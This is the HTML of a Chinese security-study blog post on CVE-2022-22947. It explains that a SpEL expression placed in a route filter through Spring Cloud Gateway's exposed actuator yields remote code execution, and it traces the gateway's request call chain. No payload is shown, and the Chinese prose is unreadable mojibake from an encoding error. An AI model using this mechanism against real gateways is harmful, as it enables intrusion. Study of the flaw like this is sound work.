

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥">
<meta property="og:url" content="http://xvshifu.github.io/2025/11/27/CVE-2022-22947%E2%80%94%E2%80%94Spring%20Cloud%20Gateway%20%E5%AD%A6%E4%B9%A0%20&%20SpEL%20%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054141.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054304.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054613.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272055281.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054785.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056114.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056847.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054128.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056999.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054165.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054221.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054725.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057823.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057165.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057402.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054299.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057629.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054915.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057207.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054589.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057965.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272057048.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054704.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058243.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054161.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058154.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054749.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054579.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058696.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054296.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058706.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054112.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272105292.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054136.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058909.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054655.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054249.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272059085.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054032.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054698.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272059951.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054432.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100828.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054315.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100000.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100525.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101289.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054683.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101705.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101150.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101037.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101993.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101184.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054514.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054014.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101089.png">
<meta property="article:published_time" content="2025-11-27T13:00:00.000Z">
<meta property="article:modified_time" content="2025-11-27T13:14:10.230Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="Java ä»£ç å®¡è®¡">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054141.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥ - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">
<link rel="stylesheet" href="/css/selection.css">
<link rel="stylesheet" href="/css/scrollAnimation.css">
<link rel="stylesheet" href="/css/border.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ–‹ï¸ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/game/" target="_self">
                <i class="iconfont icon-steam"></i>
                <span>game</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-11-27 21:00" pubdate>
          2025å¹´11æœˆ27æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          89 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2025å¹´11æœˆ27æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2022-22947â€”â€”Spring-Cloud-Gateway-å­¦ä¹ -SpEL-çš„å¤šç§æ³¨å…¥"><a href="#CVE-2022-22947â€”â€”Spring-Cloud-Gateway-å­¦ä¹ -SpEL-çš„å¤šç§æ³¨å…¥" class="headerlink" title="CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥"></a>CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥</h1><p>CVE-2022-22947 çš„èµ·å› æ˜¯ä½œè€… <a target="_blank" rel="noopener" href="https://wya.pl/">@Wyatt</a> åœ¨ <a target="_blank" rel="noopener" href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">Bring Your Own SSRF â€“ The Gateway Actuator</a> ä¸€æ–‡ä¸­æåŠåˆ°åˆ©ç”¨ Spring Cloud Gateway Actuator æ„é€  SSRFï¼Œä¹‹åè¯¥ä½œè€…åˆ©ç”¨å‘ç°çš„æš´éœ²çš„ Actuator æ‰§è¡Œå™¨ï¼Œåœ¨ <a target="_blank" rel="noopener" href="https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/">CVE-2022-22947: SpEL Casting and Evil Beans</a> ä¸­è®²åˆ°ï¼š <code>/actuator/gateway/routes/</code>åˆ›å»ºè·¯ç”±å¹¶åœ¨ <code>filters</code>å­—æ®µæ’å…¥ä¸€ä¸ª SpEL  è¡¨è¾¾å¼ï¼ŒSpring Cloud Gateway åœ¨å¤„ç†è¿‡æ»¤å™¨æ—¶ä¼šæ‰§è¡Œè¯¥è¡¨è¾¾å¼ï¼Œé€šè¿‡æ„é€ æ¶æ„ SpEL å¯å®ç° RCEã€‚</p>
<p>å…ˆæ¥å­¦ä¹ ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">Bring Your Own SSRF â€“ The Gateway Actuator</a> </p>
<h1 id="ä¸€ã€åˆ©ç”¨-Spring-Cloud-Gateway-Actuator-åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„-SSRF-å…¥å£ã€‚"><a href="#ä¸€ã€åˆ©ç”¨-Spring-Cloud-Gateway-Actuator-åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„-SSRF-å…¥å£ã€‚" class="headerlink" title="ä¸€ã€åˆ©ç”¨ Spring Cloud Gateway Actuator åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„ SSRF å…¥å£ã€‚"></a>ä¸€ã€åˆ©ç”¨ Spring Cloud Gateway Actuator åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„ SSRF å…¥å£ã€‚</h1><h2 id="1-1-Spring-Cloud-Gateway-ä»‹ç»"><a href="#1-1-Spring-Cloud-Gateway-ä»‹ç»" class="headerlink" title="1.1 Spring Cloud Gateway ä»‹ç»"></a>1.1 Spring Cloud Gateway ä»‹ç»</h2><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#gateway-starter">https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#gateway-starter</a></p>
<h3 id="1-1-1-ç®€ä»‹"><a href="#1-1-1-ç®€ä»‹" class="headerlink" title="1.1.1 ç®€ä»‹"></a>1.1.1 ç®€ä»‹</h3><p>Spring Cloud Gateway æ˜¯ Spring æä¾›çš„ <strong>API ç½‘å…³</strong>ï¼Œç”¨æ¥ä¸ºå¾®æœåŠ¡æ¶æ„æä¾›ä¸€ç§ç®€å•ã€æœ‰æ•ˆã€ç»Ÿä¸€çš„ API è·¯ç”±ç®¡ç†æ–¹å¼:</p>
<ul>
<li><strong>ç»Ÿä¸€å…¥å£</strong>ï¼ˆæ‰€æœ‰è¯·æ±‚å…ˆç»è¿‡ç½‘å…³ï¼‰</li>
<li><strong>è·¯ç”±è½¬å‘</strong>ï¼ˆæŠŠè¯·æ±‚è½¬å‘åˆ°ä¸åŒå¾®æœåŠ¡ï¼‰</li>
<li><strong>è¿‡æ»¤å™¨é“¾</strong>ï¼ˆé‰´æƒã€é™æµã€æ—¥å¿—ã€ä¿®æ”¹è¯·æ±‚&#x2F;å“åº”ç­‰ï¼‰</li>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼ˆç»“åˆ Spring Cloud LoadBalancerï¼‰</li>
<li><strong>ç»Ÿä¸€ç›‘æ§</strong>ï¼ˆActuatorã€æŒ‡æ ‡ã€å¥åº·æ£€æŸ¥ç­‰ï¼‰</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054141.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="1-1-2-ä¸‰ä¸ªæ ¸å¿ƒ"><a href="#1-1-2-ä¸‰ä¸ªæ ¸å¿ƒ" class="headerlink" title="1.1.2 ä¸‰ä¸ªæ ¸å¿ƒ"></a>1.1.2 ä¸‰ä¸ªæ ¸å¿ƒ</h3><h4 id="Route-è·¯ç”±"><a href="#Route-è·¯ç”±" class="headerlink" title="Route è·¯ç”±"></a>Route è·¯ç”±</h4><p>ç½‘å…³çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼Œç”±ä¸€ä¸ªæ ‡è¯†ç¬¦ã€ä¸€ä¸ªç›®æ ‡ URLã€ä¸€ç»„è°“è¯ä»¥åŠä¸€ç»„è¿‡æ»¤å™¨æ¥å®šä¹‰</p>
<h4 id="Predicate-æ–­è¨€"><a href="#Predicate-æ–­è¨€" class="headerlink" title="Predicate æ–­è¨€"></a>Predicate æ–­è¨€</h4><p><strong>Predicate</strong>: This is a <a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/api/java/util/function/Predicate.html">Java 8 Function Predicate</a>. The input type is a <a target="_blank" rel="noopener" href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/server/ServerWebExchange.html">Spring FrameworkServerWebExchange</a>. This lets you match on anything from the HTTP request, such as headers or parameters.</p>
<p>è°“è¯è¯´æ˜ï¼šè¿™æ˜¯ä¸€ä¸ª Java 8 å‡½æ•°è°“è¯ã€‚å…¶è¾“å…¥ç±»å‹ä¸º Spring æ¡†æ¶çš„ ServerWebExchangeã€‚å®ƒå…è®¸æ‚¨æ ¹æ® HTTP è¯·æ±‚ä¸­çš„ä»»ä½•å†…å®¹è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚å¤´ä¿¡æ¯æˆ–å‚æ•°ã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯åˆ¤æ–­æ˜¯å¦å‘½ä¸­è·¯ç”±ã€‚</p>
<h4 id="Filter-è¿‡æ»¤å™¨"><a href="#Filter-è¿‡æ»¤å™¨" class="headerlink" title="Filter è¿‡æ»¤å™¨"></a>Filter è¿‡æ»¤å™¨</h4><blockquote>
<p>Filter: These are instances of GatewayFilter that have been constructed with a specific factory. Here, you can modify requests and responses before or after sending the downstream request.</p>
</blockquote>
<p>è¿‡æ»¤å™¨ï¼šè¿™äº›æ˜¯é€šè¿‡ç‰¹å®šå·¥å‚æ„å»ºçš„ <code>GatewayFilter</code> å®ä¾‹ã€‚åœ¨æ­¤ï¼Œæ‚¨å¯ä»¥åœ¨å‘é€ä¸‹æ¸¸è¯·æ±‚ä¹‹å‰æˆ–ä¹‹åå¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>è¿‡æ»¤å™¨åœ¨è½¬å‘å‰åçš„åšå¤„ç†</p>
<h3 id="1-2-3-è°ƒç”¨é“¾"><a href="#1-2-3-è°ƒç”¨é“¾" class="headerlink" title="1.2.3 è°ƒç”¨é“¾"></a>1.2.3 è°ƒç”¨é“¾</h3><p>é¦–å…ˆæ‰¾åˆ°å…¥å£ï¼š</p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*org\springframework\spring-web\<span class="hljs-number">5.3</span><span class="hljs-number">.23</span>\spring-web<span class="hljs-number">-5.3</span><span class="hljs-number">.23</span>-sources.jar!\org\springframework\web\server\WebHandler.java*<br></code></pre></td></tr></table></figure>

<p>WebFlux æ¥æ”¶ HTTP è¯·æ±‚çš„å…¥å£ï¼Œç›¸å½“äº Servlet ä¸–ç•Œé‡Œçš„ <code>Servlet.service()</code> æ–¹æ³•ã€‚</p>
<p> å½“æµè§ˆå™¨è®¿é—® <code>http://localhost:9000/user/info</code>ï¼ˆç»“åˆä¸‹æ–¹çš„ DEMOï¼‰ æ—¶ï¼ŒNetty æˆ– Tomcatï¼ˆWebFlux é»˜è®¤æ˜¯ Nettyï¼‰æŠŠè¯·æ±‚äº¤ç»™ <code>WebHandler</code> å¤„ç†  ã€‚</p>
<p><code>handle</code>å°†è¯·æ±‚å°è£…ä¸º <code>ServerWebExchange</code>ï¼Œä¹‹åæ‰§è¡Œ <code>filter</code> çš„ä¸€ç³»åˆ—ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054304.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*org\springframework\cloud\spring-cloud-gateway-server\<span class="hljs-number">3.1</span><span class="hljs-number">.1</span>-SNAPSHOT\spring-cloud-gateway-server<span class="hljs-number">-3.1</span><span class="hljs-number">.1</span>-SNAPSHOT.jar!\org\springframework\cloud\gateway\handler\RoutePredicateHandlerMapping.<span class="hljs-keyword">class</span>*<br></code></pre></td></tr></table></figure>

<p> <code>ServerWebExchange</code>ä»<code>WebHandler</code>ä¼ åˆ°<code>RoutePredicateHandlerMapping</code>ï¼Œæ ¹æ®è¯·æ±‚ URL åŒ¹é…å¯¹åº”çš„è·¯ç”±ï¼Œä¹‹åè¿”å›ä¸€ä¸ª<code>HandlerExecutionChain </code></p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">*org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.gateway</span><span class="hljs-selector-class">.filter</span>.GatewayFilterChain*<br></code></pre></td></tr></table></figure>

<p> GatewayFilterChain ç®¡ç†æ‰€æœ‰ GatewayFilter çš„æ‰§è¡Œé¡ºåºï¼Œæ¯ä¸ª Filter é€šè¿‡é“¾å¼è°ƒç”¨å¤„ç†è¯·æ±‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054613.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*org\springframework\cloud\spring-cloud-gateway-server\<span class="hljs-number">3.1</span><span class="hljs-number">.1</span>-SNAPSHOT\spring-cloud-gateway-server<span class="hljs-number">-3.1</span><span class="hljs-number">.1</span>-SNAPSHOT.jar!\org\springframework\cloud\gateway\filter\factory\AddRequestHeaderGatewayFilterFactory.<span class="hljs-keyword">class</span>*<br></code></pre></td></tr></table></figure>

<p>åœ¨è¯·æ±‚è¢«è½¬å‘åˆ°ä¸‹æ¸¸æœåŠ¡ä¹‹å‰ï¼Œä¼šç»™<code>ServerHttpRequest</code>æ·»åŠ ä¸€ä¸ª HTTPHeaderï¼Œåœ¨æœ¬ DEMO ä¸­ï¼Œå®ƒæ˜¯ï¼š<code>AddRequestHeader=token, abc123</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272055281.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*org\springframework\cloud\spring-cloud-gateway-server\<span class="hljs-number">3.1</span><span class="hljs-number">.1</span>-SNAPSHOT\spring-cloud-gateway-server<span class="hljs-number">-3.1</span><span class="hljs-number">.1</span>-SNAPSHOT.jar!\org\springframework\cloud\gateway\filter\NettyRoutingFilter.<span class="hljs-keyword">class</span>*<br></code></pre></td></tr></table></figure>

<p><code>NettyRoutingFilter</code> ä½¿ç”¨ <code>Reactor Netty </code>çš„ <code>HttpClient</code> å°†è¯·æ±‚å¼‚æ­¥è½¬å‘åˆ°ä¸‹æ¸¸æœåŠ¡ï¼ˆå¦‚ user-serviceï¼‰ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œä¸ä»…ä¼šå®Œæˆå®é™…çš„ HTTP è¯·æ±‚è°ƒç”¨ï¼Œè¿˜ä¼šæ‹·è´åŸå§‹è¯·æ±‚ä¸­çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼ˆåŒ…æ‹¬è®¤è¯ tokenï¼‰ä»¥ç¡®ä¿ä¸Šä¸‹æ–‡çš„ä¸€è‡´æ€§ã€‚å½“ä»ä¸‹æ¸¸æœåŠ¡æ¥æ”¶åˆ°å“åº”åï¼Œè¯¥å“åº”ä¼šè¢«å°è£…æˆ <code>ServerWebExchange</code> å¯¹è±¡çš„å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™æ ·å°±å®ç°äº†ä»æ¥æ”¶è¯·æ±‚ã€è½¬å‘å¤„ç†åˆ°æœ€ç»ˆå“åº”çš„å…¨é“¾è·¯æµç¨‹ã€‚</p>
